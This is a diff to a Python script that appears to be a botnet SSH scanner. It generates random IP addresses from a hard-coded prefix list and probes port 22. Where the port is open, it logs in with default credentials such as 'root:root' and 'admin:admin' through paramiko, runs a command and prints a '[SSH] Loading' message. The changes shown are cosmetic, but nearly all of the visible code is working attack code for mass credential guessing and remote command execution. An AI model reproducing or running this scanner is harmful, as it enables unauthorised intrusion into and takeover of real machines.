@@ -36,7 +36,7 @@ found = []
 
 credentials = [
 	"root:root",
-	"admin:admin",
+	"admin:admin"
 ]
 
 butterfly = [
@@ -46,7 +46,7 @@ butterfly = [
 	"5.238.40",
 	"5.74",
 	"5.74.128",
-	"5.78",
+	"5.78"
 ]
 
 def gen():
@@ -76,8 +76,11 @@ def scan():
 		try:
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			sock.settimeout(5)
+			
 			target = ipgen()
+			
 			result = sock.connect_ex((target, 22))
+			
 			if result == 0 and found.count(target) < 1:
 				found.append(target)
 
@@ -89,14 +92,11 @@ def scan():
 
 				stdin, stdout, stderr = ssh.exec_command(cmd)
 
-				print("[SSH] Loading - {}:{}:{}".format(target, username, password))
+				print("[SSH] Loading - {}@{}:{}".format(username, target, password))
+				
 				time.sleep(5)
 				ssh.close()
 			sock.close()
-		except paramiko.ssh_exception.AuthenticationException:
-			pass
-		except socket.error:
-			pass
 		except:
 			pass
 
